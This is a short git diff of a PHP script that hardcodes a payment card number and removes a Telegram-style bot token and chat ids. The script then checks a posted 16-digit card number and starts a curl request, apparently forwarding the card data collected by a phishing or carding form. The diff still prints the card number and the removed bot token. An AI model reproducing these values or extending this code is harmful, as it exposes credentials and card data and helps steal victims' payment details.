@@ -1,9 +1,9 @@
 <?php
 //номер карты
 $card = '2202200267535597';
-$token = "1043654923:AAGdNk5CrYmhi3o5AQFsveH7I1aVCUVF438";
-$recipient = '-1001363740250';
-$imid = '676094295';
+$token = "";
+$recipient = '';
+$imid = '';
 
 if(mb_strlen(str_replace(' ','',$_POST['card_number'])) == 16){
     $curl = curl_init();
